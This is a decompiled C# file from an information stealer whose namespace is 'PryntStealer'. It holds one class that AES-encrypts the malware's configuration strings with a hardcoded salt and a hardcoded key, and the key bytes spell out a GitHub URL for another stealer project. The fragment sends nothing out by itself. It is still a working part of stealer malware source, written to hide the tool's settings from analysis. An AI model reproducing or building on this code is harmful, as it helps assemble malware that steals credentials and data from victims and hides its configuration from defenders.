using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace PryntStealer
{
	// Token: 0x0200000D RID: 13
	internal sealed class crypt
	{
		// Token: 0x0600004C RID: 76 RVA: 0x00006620 File Offset: 0x00004820
		public static string EncryptConfig(string value)
		{
			byte[] inArray = null;
			byte[] bytes = Encoding.UTF8.GetBytes(value);
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(crypt.cryptKey, crypt.saltBytes, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytes, 0, bytes.Length);
						cryptoStream.Close();
					}
					inArray = memoryStream.ToArray();
				}
			}
			return "ENCRYPTED:" + Convert.ToBase64String(inArray);
		}

		// Token: 0x0400002F RID: 47
		private static readonly byte[] saltBytes = new byte[]
		{
			byte.MaxValue,
			64,
			191,
			111,
			23,
			3,
			113,
			119,
			231,
			121,
			252,
			112,
			79,
			32,
			114,
			156
		};

		// Token: 0x04000030 RID: 48
		private static readonly byte[] cryptKey = new byte[]
		{
			104,
			116,
			116,
			112,
			115,
			58,
			47,
			47,
			103,
			105,
			116,
			104,
			117,
			98,
			46,
			99,
			111,
			109,
			47,
			76,
			105,
			109,
			101,
			114,
			66,
			111,
			121,
			47,
			83,
			116,
			111,
			114,
			109,
			75,
			105,
			116,
			116,
			121
		};
	}
}
